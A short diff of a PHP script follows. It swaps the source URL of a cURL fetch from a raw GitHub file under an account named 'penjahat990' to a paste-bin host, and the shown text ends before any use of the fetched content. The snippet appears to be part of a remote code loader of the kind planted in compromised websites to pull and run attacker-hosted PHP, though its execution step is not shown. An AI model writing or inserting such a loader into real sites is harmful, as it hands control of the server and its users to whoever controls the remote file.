@@ -1,5 +1,5 @@
 <?php
-$url = "https://raw.githubusercontent.com/penjahat990/lp1/refs/heads/main/index.php";
+$url = "https://bin.mudfish.net/r/986-9568-7642";
 
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, $url);
